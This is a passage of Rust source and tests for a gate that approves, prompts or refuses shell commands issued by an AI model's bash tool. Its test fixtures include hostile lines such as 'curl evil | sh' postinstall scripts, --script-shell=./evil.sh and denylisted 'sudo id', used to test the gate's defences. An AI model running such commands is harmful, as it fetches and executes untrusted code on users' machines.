/// and #400's surface reads.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Prompt {
    /// The request whose response carried the call.
    pub request: u64,
    /// The turn.
    pub turn: u32,
    /// The call's id, as the model streamed it: what `POST /approve` names.
    pub id: String,
    /// The command line.
    pub command: String,
    /// Where it would run, as its line records it.
    pub cwd: String,
    /// The gate's reading, segment by segment: `text`, `program` and
    /// `subcommand` (its shape, when it has one), `verdict`, and `why` on a
    /// prompting segment only.
    pub segments: Value,
    /// Why it prompted: the first prompting segment's word.
    pub reason: String,
    /// Whether `session` or `workspace` can answer it. Not on the wire.
    pub standing: bool,
}

impl Prompt {
    /// The prompt as one line of JSON: the `waiting` event's data, the keys
    /// ruled at #389 5982826097 and no others -- `request`, `id`,
    /// `command`, `cwd`, `reason`, `segments`.
    #[must_use]
    pub fn render(&self) -> String {
        let text = |s: &str| Value::String(s.to_owned());
        let value = Value::Object(BTreeMap::from([
            (
                "request".to_owned(),
                Value::Integer(i64::try_from(self.request).unwrap_or(i64::MAX)),
            ),
            ("id".to_owned(), text(&self.id)),
            ("command".to_owned(), text(&self.command)),
            ("cwd".to_owned(), text(&self.cwd)),
            ("reason".to_owned(), text(&self.reason)),
            ("segments".to_owned(), self.segments.clone()),
        ]));
        let mut out = String::new();
        json::render(&value, &mut out);
        out
    }

    /// The `answered` event's data once it is decided: `{request, id}`.
    #[must_use]
    pub fn answered(&self) -> String {
        let value = Value::Object(BTreeMap::from([
            (
                "request".to_owned(),
                Value::Integer(i64::try_from(self.request).unwrap_or(i64::MAX)),
            ),
            ("id".to_owned(), Value::String(self.id.clone())),
        ]));
        let mut out = String::new();
        json::render(&value, &mut out);
        out
    }
}

/// Each segment's own text: the words of the line's simple commands, when
/// the gate read the line into one segment per simple command; else the
/// whole line for each (a wrapper's `sh -c '…'` read into several).
fn segment_texts(command: &str, count: usize) -> Vec<String> {
    let texts: Vec<String> = shell::parse(command)
        .map(|list| {
            list.simple_commands()
                .map(|simple| {
                    simple
                        .words
                        .iter()
                        .map(|word| word.text.as_str())
                        .collect::<Vec<_>>()
                        .join(" ")
                })
                .collect()
        })
        .unwrap_or_default();
    if texts.len() == count {
        texts
    } else {
        vec![command.to_owned(); count]
    }
}

/// The segments as the `waiting` event carries them (#389 5982826097
/// point 2): the gate module's `Shape` -- whole as `shape`, the key the log's
/// approval segments use, and as `program` and `subcommand` -- and
/// `Verdict`, `why` on a prompting segment only.
fn segment_values(judged: &Judged) -> Value {
    let text = |s: &str| Value::String(s.to_owned());
    let segments = &judged.judgement.segments;
    let texts = segment_texts(&judged.command, segments.len());
    Value::Array(
        segments
            .iter()
            .zip(texts)
            .map(|(segment, said)| {
                let mut fields = BTreeMap::from([("text".to_owned(), text(&said))]);
                if let Some(shape) = &segment.shape {
                    // Whole, as the log's approval segments write it and the
                    // surface reads it: what a standing approval would cover.
                    fields.insert("shape".to_owned(), text(&shape.to_string()));
                    fields.insert("program".to_owned(), text(&shape.program));
                    if let Some(sub) = &shape.subcommand {
                        fields.insert("subcommand".to_owned(), text(sub));
                    }
                }
                let verdict = match &segment.verdict {
                    Verdict::Refused(_) => "refused",
                    Verdict::Prompt(why) => {
                        fields.insert("why".to_owned(), text(why_word(why)));
                        "prompt"
                    }
                    Verdict::Free => "free",
                    Verdict::Approved(_) => "approved",
                };
                fields.insert("verdict".to_owned(), text(verdict));
                Value::Object(fields)
            })
            .collect(),
    )
}

/// The prompt `judged` puts to the operator.
#[must_use]
pub fn prompt_of(judged: &Judged, request: u64, turn: u32, call: &str, cwd: &str) -> Prompt {
    Prompt {
        request,
        turn,
        id: call.to_owned(),
        command: judged.command.clone(),
        cwd: cwd.to_owned(),
        segments: segment_values(judged),
        reason: judged.why().unwrap_or("not_approved").to_owned(),
        standing: judged.standing(),
    }
}

#[cfg(test)]
pub(in crate::drive) mod tests {
    use super::*;

    /// `tool_surface` (#557): absent or `bash`, today's single tool;
    /// `standard`, `bash` and the standard set, with `read` as the read tool
    /// a capped output's notice names; anything else refused.
    #[test]
    fn the_tool_surface_is_bash_or_standard() {
        let read = |text: &str| tool_surface(&regimen::parse(text).expect("a regimen"));
        assert_eq!(read(""), Ok(ToolSurface::Bash));
        assert_eq!(read("tool_surface = \"bash\"\n"), Ok(ToolSurface::Bash));
        assert_eq!(
            read("tool_surface = \"standard\"\n"),
            Ok(ToolSurface::Standard)
        );
        assert!(read("tool_surface = \"everything\"\n").is_err());
        let names = |surface: ToolSurface| -> Vec<String> {
            surface.tools().into_iter().map(|tool| tool.name).collect()
        };
        assert_eq!(names(ToolSurface::Bash), ["bash"]);
        assert_eq!(
            names(ToolSurface::Standard),
            ["bash", "read", "write", "edit", "grep", "glob"]
        );
        assert_eq!(ToolSurface::Bash.read_tool(), None);
        assert_eq!(ToolSurface::Standard.read_tool().as_deref(), Some("read"));
    }

    /// `[tool_output]` (#554): absent, the convention's default cap; `cap =
    /// false`, the output kept whole; limits set by `max_lines` and
    /// `max_bytes`; anything else refused.
    #[test]
    fn the_tool_output_table_reads_as_the_default_cap_keep_or_its_limits() {
        let read = |text: &str| output_cap(&regimen::parse(text).expect("a regimen"));
        assert_eq!(read(""), Ok(OutputCap::DEFAULT));
        assert_eq!(read("[tool_output]\ncap = false\n"), Ok(OutputCap::Keep));
        assert_eq!(
            read("[tool_output]\nmax_lines = 100\n"),
            Ok(OutputCap::Capped {
                max_lines: 100,
                max_bytes: 51_200
            })
        );
        assert_eq!(
            read("[tool_output]\nmax_lines = 10\nmax_bytes = 2048\n"),
            Ok(OutputCap::Capped {
                max_lines: 10,
                max_bytes: 2048
            })
        );
        for refused in [
            "tool_output = 4000\n",
            "[tool_output]\ncap = \"no\"\n",
            "[tool_output]\nmax_lines = 0\n",
            "[tool_output]\nmax_bytes = \"lots\"\n",
        ] {
            assert!(read(refused).is_err(), "{refused}");
        }
    }

    /// A git alias reader that knows none.
    pub(in crate::drive) fn no_aliases(_: &Path, _: &str) -> Option<String> {
        None
    }

    /// A repository with nothing a free read depends on.
    #[allow(clippy::unnecessary_wraps)] // a `RepositoryReader`
    pub(in crate::drive) fn clean_repository(_: &Path) -> Option<Repository> {
        Some(Repository {
            info_attributes: false,
            signing: false,
            branch_sort: false,
        })
    }

    fn gate_in(worktree: &Path) -> Gate {
        Gate {
            aliases: no_aliases,
            repository: clean_repository,
            ..Gate::standard(worktree)
        }
    }

    pub(in crate::drive) fn scratch(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "diet-tool-loop-{name}-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a scratch dir");
        dir
    }

    #[test]
    fn a_calls_fragments_assemble_in_order_and_its_first_id_and_name_stand() {
        let mut calls = Calls::default();
        calls.piece(0, Some("a"), Some("bash"), "{");
        calls.piece(1, Some("b"), Some("bash"), "{}");
        calls.piece(0, None, None, "\"command\":\"ls\"}");
        assert_eq!(
            calls.into_calls(),
            [
                Call {
                    index: 0,
                    id: "a".to_owned(),
                    name: "bash".to_owned(),
                    arguments: "{\"command\":\"ls\"}".to_owned()
                },
                Call {
                    index: 1,
                    id: "b".to_owned(),
                    name: "bash".to_owned(),
                    arguments: "{}".to_owned()
                },
            ]
        );
    }

    #[test]
    fn the_bash_tools_arguments_are_one_command_string_and_nothing_else() {
        assert_eq!(command_of("{\"command\":\"ls\"}"), Some("ls".to_owned()));
        assert_eq!(command_of("{\"command\":1}"), None);
        assert_eq!(command_of("{\"command\":\"ls\",\"x\":1}"), None);
        assert_eq!(command_of("{\"command\":\"ls\""), None);
        assert_eq!(command_of("[\"ls\"]"), None);
    }

    #[test]
    fn the_bash_tool_renders_as_i0_declared_it_with_its_own_words() {
        let mut out = String::new();
        json::render(&bash_tool().schema, &mut out);
        assert_eq!(
            out,
            "{\"properties\":{\"command\":{\"description\":\"Shell command to execute\",\
             \"type\":\"string\"}},\"required\":[\"command\"],\"type\":\"object\"}"
        );
    }

    /// Before #558, `bash` was I0's definition byte for byte, and no
    /// description.
    #[test]
    fn the_bash_tool_before_its_description_is_i0s() {
        let tool = bash_tool_before_its_description();
        assert_eq!(tool.name, BASH);
        assert_eq!(tool.description, None);
        let mut out = String::new();
        json::render(&tool.schema, &mut out);
        assert_eq!(
            out,
            "{\"properties\":{\"command\":{\"description\":\"the command to run in bash\",\
             \"type\":\"string\"}},\"required\":[\"command\"],\"type\":\"object\"}"
        );
    }

    #[test]
    fn a_session_approval_covers_its_programs_shape_and_never_another_program() {
        let dir = scratch("covers");
        let gate = gate_in(&dir);
        let first = gate.judge("cat a.txt", &[]);
        assert_eq!(first.outcome(), shell_gate::Outcome::Prompt);
        let granted = first.grants(Scope::Session, 5);
        assert_eq!(granted.len(), 1);
        assert_eq!(granted[0].shape.program, "cat");

        let again = gate.judge("cat b.txt", &granted);
        assert_eq!(
            again.outcome(),
            shell_gate::Outcome::Run,
            "the shape, any arguments"
        );
        assert_eq!(again.covered_by, [Some(0)]);

        for other in ["ls", "head a.txt", "rm a.txt"] {
            assert_eq!(
                gate.judge(other, &granted).outcome(),
                shell_gate::Outcome::Prompt,
                "`cat`'s approval covered `{other}`"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_denylisted_segment_anywhere_in_the_line_refuses_it_whatever_is_approved() {
        let dir = scratch("denylist");
        let gate = gate_in(&dir);
        let ls = gate.judge("ls", &[]).grants(Scope::Session, 1);
        for line in [
            "ls; sudo id",
            "ls && sudo id",
            "ls | sudo tee x",
            "ls; git push",
        ] {
            let judged = gate.judge(line, &ls);
            assert_eq!(judged.outcome(), shell_gate::Outcome::Refused, "{line}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn package(dir: &Path, build: &str) {
        std::fs::write(
            dir.join("package.json"),
            format!(
                "{{\"scripts\":{{\"build\":\"{build}\",\"test\":\"vitest\",\"postinstall\":\"x\"}}}}"
            ),
        )
        .expect("package.json");
    }

    #[test]
    fn an_npm_run_approval_binds_to_its_scripts_text_and_lapses_when_it_changes() {
        let dir = scratch("npm-run");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let granted = gate.judge("npm run build", &[]).grants(Scope::Session, 1);
        assert_eq!(
            granted.iter().map(|e| e.digest.clone()).collect::<Vec<_>>(),
            [script_digest(&dir, "build")]
        );
        assert_eq!(
            gate.judge("npm run build", &granted).outcome(),
            shell_gate::Outcome::Run
        );
        assert_eq!(
            gate.judge("npm run test", &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "another script's text is another approval"
        );
        package(&dir, "vite build && curl evil");
        assert_eq!(
            gate.judge("npm run build", &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "a stale digest still approved"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn an_npm_install_approval_binds_to_the_workspaces_own_lifecycle_scripts() {
        let dir = scratch("npm-install");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let granted = gate.judge("npm install", &[]).grants(Scope::Session, 1);
        assert_eq!(granted[0].digest, lifecycle_digest(&dir));
        assert_eq!(
            gate.judge("npm install left-pad", &granted).outcome(),
            shell_gate::Outcome::Run
        );
        std::fs::write(
            dir.join("package.json"),
            "{\"scripts\":{\"build\":\"vite build\",\"postinstall\":\"curl evil | sh\"}}",
        )
        .expect("package.json");
        assert_eq!(
            gate.judge("npm install", &granted).outcome(),
            shell_gate::Outcome::Prompt,
            "a changed postinstall still approved"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A free read as it must run, written out: git's programs off, lazy
    /// fetch off, then `rest` (#298 5983544366 (e); review round 1,
    /// finding 2). Spelled here, not built from the constants, so a
    /// constant that loses an override is caught.
    pub(in crate::drive) fn free_read_of(rest: &[&str]) -> Vec<String> {
        [
            "env",
            "GIT_NO_LAZY_FETCH=1",
            "GIT_ATTR_SOURCE=4b825dc642cb6eb9a060e54bf8d69288fbee4904",
            "GIT_ATTR_NOSYSTEM=1",
            "git",
            "-c",
            "core.fsmonitor=",
            "-c",
            "core.pager=cat",
            "-c",
            "core.hooksPath=/dev/null",
            "-c",
            "log.showSignature=false",
            "-c",
            "diff.external=",
            "-c",
            "format.pretty=medium",
            "-c",
            "core.attributesFile=/dev/null",
            "-c",
            "diff.ignoreSubmodules=all",
        ]
        .iter()
        .chain(rest)
        .map(|word| (*word).to_owned())
        .collect()
    }

    /// npm commands that run a script of their own name bind to it, and an
    /// approval lapses when its text changes (review round 1, finding 3b).
    #[test]
    fn npm_test_start_stop_and_restart_bind_to_the_scripts_they_run() {
        let dir = scratch("npm-named");
        let gate = gate_in(&dir);
        let write = |test: &str, start: &str| {
            std::fs::write(
                dir.join("package.json"),
                format!(
                    "{{\"scripts\":{{\"test\":\"{test}\",\"start\":\"{start}\",\"stop\":\"x\"}}}}"
                ),
            )
            .expect("package.json");
        };
        write("vitest", "vite");
        for line in ["npm test", "npm start", "npm stop", "npm restart"] {
            let granted = gate.judge(line, &[]).grants(Scope::Session, 1);
            assert!(
                granted.iter().all(|e| e.digest.is_some()),
                "`{line}` binds to a digest: {granted:?}"
            );
            assert_eq!(
                gate.judge(line, &granted).outcome(),
                shell_gate::Outcome::Run,
                "{line}"
            );
        }
        let test = gate.judge("npm test", &[]).grants(Scope::Session, 1);
        let start = gate.judge("npm start", &[]).grants(Scope::Session, 1);
        let restart = gate.judge("npm restart", &[]).grants(Scope::Session, 1);
        write("vitest; curl evil", "vite");
        assert_eq!(
            gate.judge("npm test", &test).outcome(),
            shell_gate::Outcome::Prompt,
            "a changed `scripts.test` still approved `npm test`"
        );
        write("vitest", "vite --host 0.0.0.0");
        assert_eq!(
            gate.judge("npm start", &start).outcome(),
            shell_gate::Outcome::Prompt,
            "a changed `scripts.start` still approved `npm start`"
        );
        assert_eq!(
            gate.judge("npm restart", &restart).outcome(),
            shell_gate::Outcome::Prompt,
            "`npm restart` runs `start` when it has no `restart`"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The `waiting` event names what a standing approval of the call would
    /// cover, as `shape` -- the key the surface and the log's approval
    /// segments read -- beside `program` and `subcommand`: `npm install`
    /// for `npm install` (T1's approval piece).
    #[test]
    fn a_waiting_prompt_names_the_shape_a_standing_approval_covers() {
        let dir = scratch("waiting-shape");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let judged = gate.judge("npm install", &[]);
        assert_eq!(judged.outcome(), shell_gate::Outcome::Prompt);
        let waiting: serde_json::Value =
            serde_json::from_str(&prompt_of(&judged, 1, 1, "call-1", ".").render()).expect("JSON");
        assert_eq!(
            waiting["segments"],
            serde_json::json!([{
                "text": "npm install",
                "shape": "npm install",
                "program": "npm",
                "subcommand": "install",
                "verdict": "prompt",
                "why": "not_approved",
            }]),
            "{waiting}"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// An npm command told to read another `package.json` is covered by no
    /// standing approval: the digest is of the worktree's (finding 3a).
    #[test]
    fn an_npm_command_told_to_read_another_package_json_always_prompts() {
        let dir = scratch("npm-elsewhere");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let mut granted = gate.judge("npm run build", &[]).grants(Scope::Session, 1);
        granted.extend(gate.judge("npm install", &[]).grants(Scope::Session, 1));
        assert_eq!(
            gate.judge("npm run build", &granted).outcome(),
            shell_gate::Outcome::Run
        );
        for line in [
            "npm run build --prefix sub",
            "npm run build --prefix=sub",
            "npm run build -C sub",
            "npm run build -w sub",
            "npm run build --workspace sub",
            "npm run build --workspace=sub",
            "npm run build --workspaces",
            "npm run build -ws",
            "npm run build --include-workspace-root",
            "npm install --prefix sub",
            "env npm install",
        ] {
            let judged = gate.judge(line, &granted);
            assert_eq!(
                judged.outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` was covered"
            );
            assert!(!judged.standing(), "`{line}` could be approved standing");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A standing npm approval covers only the exact forms the operator
    /// saw (review round 2, finding 2): `npm run <name>`, `npm
    /// test|start|stop|restart`, `npm install` bare or with plain package
    /// names, `npm ci` bare -- no option word anywhere, no other spelling.
    /// Anything else prompts every time, and no standing scope answers it.
    #[test]
    fn a_standing_npm_approval_covers_only_the_exact_forms_and_no_option() {
        let dir = scratch("npm-exact");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let mut granted = Vec::new();
        for line in [
            "npm run build",
            "npm test",
            "npm start",
            "npm install",
            "npm install left-pad",
            "npm ci",
        ] {
            let judged = gate.judge(line, &[]);
            assert!(
                judged.standing(),
                "`{line}` is a form a standing approval covers"
            );
            granted.extend(judged.grants(Scope::Session, 1));
        }
        for line in ["npm run build", "npm test", "npm install", "npm ci"] {
            assert_eq!(
                gate.judge(line, &granted).outcome(),
                shell_gate::Outcome::Run,
                "{line}"
            );
        }
        for line in [
            "npm run build --script-shell=./evil.sh",
            "npm run build --script-shell ./evil.sh",
            "npm test --script-shell=./evil.sh",
            "npm run build --userconfig=./rc2",
            "npm run --loglevel silly build",
            "npm run build -- --flag",
            "npm run build extra",
            "npm tes",
            "npm t",
            "npm run-s build",
            "npm run-script build",
            "npm rum build",
            "npm it",
            "npm cit",
            "npm pack",
            "npm version patch",
            "npm i",
            "npm add left-pad",
            "npm install ./local",
            "npm install git+https://example.invalid/x.git",
            "npm install --ignore-scripts",
            "npm ci left-pad",
        ] {
            let judged = gate.judge(line, &granted);
            assert_eq!(
                judged.outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` was covered"
            );
            assert!(!judged.standing(), "`{line}` could be approved standing");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A worktree `.npmrc` changes what npm runs (`script-shell`,
    /// `node-options`): it is in every npm digest, so a change lapses the
    /// approval; and an `npm_config_*` variable passed to commands makes
    /// every npm command non-standing (round 2, finding 2).
    #[test]
    fn an_npmrc_or_an_npm_config_variable_lapses_every_npm_approval() {
        let dir = scratch("npm-rc");
        let gate = gate_in(&dir);
        package(&dir, "vite build");
        let mut granted = gate.judge("npm run build", &[]).grants(Scope::Session, 1);
        granted.extend(gate.judge("npm install", &[]).grants(Scope::Session, 1));
        std::fs::write(dir.join(".npmrc"), "script-shell=./evil.sh\n").expect(".npmrc");
        for line in ["npm run build", "npm install"] {
            assert_eq!(
                gate.judge(line, &granted).outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` ran under an .npmrc its approval never saw"
            );
        }
        std::fs::remove_file(dir.join(".npmrc")).expect("removed");
        let passing = |names: &[&str]| Gate {
            aliases: no_aliases,
            repository: clean_repository,
            ..Gate::standard(&dir)
                .passing(&names.iter().map(|n| (*n).to_owned()).collect::<Vec<_>>())
        };
        // The cache directory chooses nothing that runs (#301): standing.
        for cache in ["npm_config_cache", "NPM_CONFIG_CACHE"] {
            let judged = passing(&["PATH", cache]).judge("npm run build", &granted);
            assert_eq!(judged.outcome(), shell_gate::Outcome::Run, "{cache}");
            assert!(judged.standing(), "{cache}");
        }
        // Any other npm_config_* can choose what runs: never standing.
        for other in [
            "npm_config_script_shell",
            "NPM_CONFIG_SCRIPT_SHELL",
            "npm_config_node_options",
        ] {
            let judged =
                passing(&["PATH", "npm_config_cache", other]).judge("npm run build", &granted);
            assert_eq!(judged.outcome(), shell_gate::Outcome::Prompt, "{other}");
            assert!(!judged.standing(), "{other}");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_git_read_that_would_run_a_configured_program_is_not_free() {
        let dir = scratch("git-programs");
        let gate = gate_in(&dir);
        for line in [
            "git diff --ext-diff",
            "git show --ext-diff",
            "git log -p --textconv",
            "git diff --textconv",
            "git log --show-signature",
            "git show --show-signature",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` ran as a free read"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn git_in(dir: &Path, args: &[&str]) -> std::process::Output {
        Command::new("git")
            .args(["-c", "user.name=t", "-c", "user.email=t@t"])
            .args(args)
            .current_dir(dir)
            .output()
            .expect("git runs")
    }

    /// The free read as the loop runs it, unconfined, in `dir`.
    /// Judged by the real gate: git's own reading of the repository.
    fn run_free(dir: &Path, line: &str) -> std::process::Output {
        let judged = Gate {
            aliases: no_aliases,
            ..Gate::standard(dir)
        }
        .judge(line, &[]);
        assert_eq!(judged.outcome(), shell_gate::Outcome::Run, "{line}");
        Command::new(&judged.run[0])
            .args(&judged.run[1..])
            .current_dir(dir)
            .output()
            .expect("it runs")
    }

    fn marker_program(dir: &Path, marker: &Path) -> PathBuf {
        use std::os::unix::fs::PermissionsExt as _;
        let program = dir.join("program.sh");
        std::fs::write(
            &program,
            format!("#!/bin/sh\ntouch '{}'\nexit 1\n", marker.display()),
        )
        .expect("a program");
        std::fs::set_permissions(&program, std::fs::Permissions::from_mode(0o755))
            .expect("executable");
        program
    }

    /// A signed commit on `HEAD` in `repo`: `log` would verify it.
    fn sign_head(repo: &Path, dir: &Path) {
        let tree = String::from_utf8(git_in(repo, &["write-tree"]).stdout).expect("utf-8");
        let head = String::from_utf8(git_in(repo, &["rev-parse", "HEAD"]).stdout).expect("utf-8");
        let commit = format!(
            "tree {}\nparent {}\nauthor t <t@t> 0 +0000\ncommitter t <t@t> 0 +0000\n\
             gpgsig -----BEGIN PGP SIGNATURE-----\n \n x\n -----END PGP SIGNATURE-----\n\nsigned\n",
            tree.trim(),
            head.trim()
        );
        let object = dir.join("commit.txt");
        std::fs::write(&object, commit).expect("a commit object");
        let sha = git_in(
            repo,
            &[
                "hash-object",
                "-t",
                "commit",
                "-w",
                &object.to_string_lossy(),
            ],
        );
        let sha = String::from_utf8(sha.stdout).expect("utf-8");
        git_in(repo, &["update-ref", "HEAD", sha.trim()]);
    }

    /// The real gate's verdict on `line` in `repo`.
    fn real_outcome(repo: &Path, line: &str) -> shell_gate::Outcome {
        Gate {
            aliases: no_aliases,
            ..Gate::standard(repo)
        }
        .judge(line, &[])
        .outcome()
    }

    /// The reviewers' probes, kept (rounds 1 and 2, finding 1/2): every way
    /// a repository's config makes a read run a program -- `diff.external`,
    /// a clean filter and a textconv driver named by `.gitattributes` --
    /// runs it under plain git, and not under a free read as the loop runs
    /// it; and what the overrides cannot reach (`info/attributes`, a signing
    /// or format key) makes the read prompt.
    #[test]
    #[allow(clippy::too_many_lines)]
    fn a_free_read_runs_no_program_the_repositorys_config_names() {
        // A directory with no shell metacharacter in its name: git runs
        // `diff.external` and filters through the shell.
        let dir = std::env::temp_dir().join(format!("diet-git-programs-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a scratch dir");
        let repo = dir.join("repo");
        std::fs::create_dir_all(&repo).expect("a repo");
        let marker = dir.join("ran");
        let program = marker_program(&dir, &marker);
        let program = program.to_string_lossy().into_owned();
        git_in(&repo, &["init", "-q"]);
        std::fs::write(repo.join("f"), "a\n").expect("a file");
        git_in(&repo, &["add", "f"]);
        git_in(&repo, &["commit", "-qm", "a"]);
        let check = |what: &str, line: &str, plain: &[&str]| {
            let _ = std::fs::remove_file(&marker);
            let said = git_in(&repo, plain);
            assert!(
                marker.exists(),
                "control ({what}): plain `{plain:?}` runs the program: {said:?}"
            );
            let _ = std::fs::remove_file(&marker);
            run_free(&repo, line);
            assert!(
                !marker.exists(),
                "({what}) the free read `{line}` ran the program"
            );
        };

        // diff.external.
        std::fs::write(repo.join("f"), "b\n").expect("a change");
        git_in(&repo, &["config", "diff.external", &program]);
        check("diff.external", "git diff", &["diff"]);
        git_in(&repo, &["config", "--unset", "diff.external"]);

        // A clean filter named in the tree's `.gitattributes`.
        git_in(&repo, &["config", "filter.x.clean", &program]);
        std::fs::write(repo.join(".gitattributes"), "f filter=x\n").expect("attributes");
        check("clean filter", "git status", &["status"]);
        check("clean filter", "git diff", &["diff"]);
        // The same filter named in `info/attributes`: no override reaches
        // it, so the read prompts.
        std::fs::remove_file(repo.join(".gitattributes")).expect("removed");
        std::fs::write(repo.join(".git/info/attributes"), "f filter=x\n").expect("info");
        for line in ["git status", "git diff", "git log -1"] {
            assert_eq!(
                real_outcome(&repo, line),
                shell_gate::Outcome::Prompt,
                "`{line}` with an info/attributes"
            );
        }
        std::fs::remove_file(repo.join(".git/info/attributes")).expect("removed");
        git_in(&repo, &["config", "--unset", "filter.x.clean"]);
        git_in(&repo, &["checkout", "-q", "f"]);

        // A textconv driver named in a committed `.gitattributes`.
        git_in(&repo, &["config", "diff.t.textconv", &program]);
        std::fs::write(repo.join(".gitattributes"), "f diff=t\n").expect("attributes");
        git_in(&repo, &["add", ".gitattributes"]);
        git_in(&repo, &["commit", "-qm", "attr"]);
        std::fs::write(repo.join("f"), "c\n").expect("a change");
        git_in(&repo, &["add", "f"]);
        git_in(&repo, &["commit", "-qm", "c"]);
        check("textconv", "git log -p -1", &["log", "-p", "-1"]);
        check("textconv", "git show", &["show"]);
        git_in(&repo, &["config", "diff.t.command", &program]);
        check("diff driver", "git show", &["show"]);
        git_in(&repo, &["config", "--unset", "diff.t.command"]);
        git_in(&repo, &["config", "--unset", "diff.t.textconv"]);

        // A signature: `format.pretty` naming `%G?` runs `gpg.program` under
        // plain `git log`; with a signing key in the config, a free read
        // that prints commits prompts.
        sign_head(&repo, &dir);
        git_in(&repo, &["config", "gpg.program", &program]);
        git_in(&repo, &["config", "format.pretty", "format:%h %G?"]);
        let _ = std::fs::remove_file(&marker);
        git_in(&repo, &["log", "-1"]);
        assert!(marker.exists(), "control: format.pretty runs gpg.program");
        for line in ["git log -1", "git show -s", "git branch -v"] {
            assert_eq!(
                real_outcome(&repo, line),
                shell_gate::Outcome::Prompt,
                "`{line}` with a signing key"
            );
        }
        assert_eq!(
            real_outcome(&repo, "git status"),
            shell_gate::Outcome::Run,
            "a read that prints no commit stays free"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The options a free read may not carry (round 2, finding 1(b), (c)):
    /// each makes the read prompt.
    #[test]
    fn a_git_read_whose_options_reach_a_program_or_a_signature_prompts() {
        let dir = scratch("git-options");
        let gate = gate_in(&dir);
        for line in [
            "git status -v",
            "git status -vv",
            "git status --verbose",
            "git status -sv",
            "git log --format=%G?",
            "git log --format=%g?",
            "git log --pretty=%GS",
            "git log --pretty=format:%h%GK",
            "git show -s --pretty=mine",
            "git log --format=mine",
            "git branch '--format=%(signature)'",
            "git branch --list '--format=%(signature:grade)'",
            "git diff --no-index a b",
            "git diff --submodule=diff",
            "git status --ignore-submodules=none",
            "git log --format",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Prompt,
                "`{line}` ran as a free read"
            );
        }
        for line in [
            "git status -s",
            "git log --oneline",
            "git log --pretty=oneline",
            "git log --format=%h%x20%s",
            "git log --format=format:%h",
            "git branch -v",
            "git branch '--format=%(refname:short)'",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Run,
                "`{line}` should stay free"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A free read in a partial clone does not fetch what it lacks (round
    /// 1, finding 2): a lazy fetch runs a transport.
    #[test]
    fn a_free_read_in_a_partial_clone_fetches_nothing() {
        let dir = scratch("git-lazy-fetch");
        let source = dir.join("source");
        std::fs::create_dir_all(&source).expect("a source");
        git_in(&source, &["init", "-q"]);
        for text in ["a\n", "b\n"] {
            std::fs::write(source.join("f"), text).expect("a file");
            git_in(&source, &["add", "f"]);
            git_in(&source, &["commit", "-qm", text.trim()]);
        }
        git_in(&source, &["config", "uploadpack.allowFilter", "true"]);
        git_in(
            &source,
            &["config", "uploadpack.allowAnySHA1InWant", "true"],
        );
        let url = format!("file://{}", source.display());
        let clone = |name: &str| {
            let at = dir.join(name);
            git_in(
                &dir,
                &[
                    "clone",
                    "-q",
                    "--filter=blob:none",
                    "--no-checkout",
                    &url,
                    name,
                ],
            );
            at
        };
        let control = clone("control");
        let fetched = git_in(&control, &["log", "-p", "--no-ext-diff"]);
        assert!(
            String::from_utf8_lossy(&fetched.stdout).contains("+b"),
            "control: plain git fetches the blobs lazily"
        );
        let free = clone("free");
        let read = run_free(&free, "git log -p");
        assert!(
            !String::from_utf8_lossy(&read.stdout).contains("+b"),
            "the free read fetched a blob"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_free_git_read_runs_with_gits_programs_off_and_keeps_the_models_argv() {
        let dir = scratch("free-read");
        let gate = gate_in(&dir);
        let judged = gate.judge("git status", &[]);
        assert_eq!(judged.outcome(), shell_gate::Outcome::Run);
        assert_eq!(judged.argv, argv_of("git status"));
        assert_eq!(
            judged.run,
            free_read_of(&["status", "--ignore-submodules=all"])
        );
        let judged = gate.judge("git log -1", &[]);
        assert_eq!(
            judged.run,
            free_read_of(&[
                "log",
                "--no-ext-diff",
                "--no-textconv",
                "--ignore-submodules=all",
                "-1"
            ])
        );
        // A free read this cannot run with its overrides prompts instead.
        for line in [
            "git status; git log",
            "git status > /dev/null",
            "env git status",
        ] {
            assert_eq!(
                gate.judge(line, &[]).outcome(),
                shell_gate::Outcome::Prompt,
                "{line}"
            );
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn aliased(_: &Path, name: &str) -> Option<String> {
        const ALIASES: &[(&str, &str)] = &[
            ("st", "status"),
            ("p", "push"),
            ("x", "!sudo id"),
            ("y", "!ls"),
        ];
        ALIASES
            .iter()
            .find(|(alias, _)| *alias == name)
            .map(|(_, expansion)| (*expansion).to_owned())
    }

    #[test]
    fn a_git_alias_is_judged_by_its_expansion_and_no_standing_approval_covers_it() {
        let dir = scratch("alias");
        let gate = Gate {
            aliases: aliased,
            repository: clean_repository,
            ..Gate::standard(&dir)
        };
